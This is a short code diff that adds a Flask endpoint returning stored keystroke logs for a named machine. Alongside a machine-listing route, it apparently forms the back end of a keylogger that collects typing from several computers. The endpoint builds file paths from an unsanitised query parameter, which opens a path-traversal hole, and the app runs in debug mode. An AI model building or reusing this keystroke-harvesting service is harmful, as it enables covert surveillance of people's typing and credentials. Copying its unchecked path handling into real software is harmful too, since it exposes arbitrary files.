@@ -54,5 +54,25 @@ def list_machines():
     return jsonify({"machines": machines}), 200
 
 
+@app.route('/api/get_keystrokes', methods=['GET'])
+def get_key_strokes_by_machine():
+    machine_name = request.args.get("machine")
+
+    if not machine_name:
+        return jsonify({"error": "Missing 'machine' query parameter."}), 400
+
+    machine_dir = os.path.join(LOGS_DIR, machine_name)
+    if not os.path.exists(machine_dir):
+        return jsonify({"error": f"Machine {machine_name} not found"}), 404
+    logs = {}
+    for file in os.listdir(machine_dir):
+        file_path = os.path.join(machine_dir, file)
+        if os.path.isfile(file_path):
+            with open(file_path, "r", encoding="utf-8") as f:
+                log = json.load(f)
+                logs.update(log)
+    return jsonify({"machine": machine_name, "logs": logs}), 200
+
+
 if __name__ == "__main__":
     app.run(debug=True)
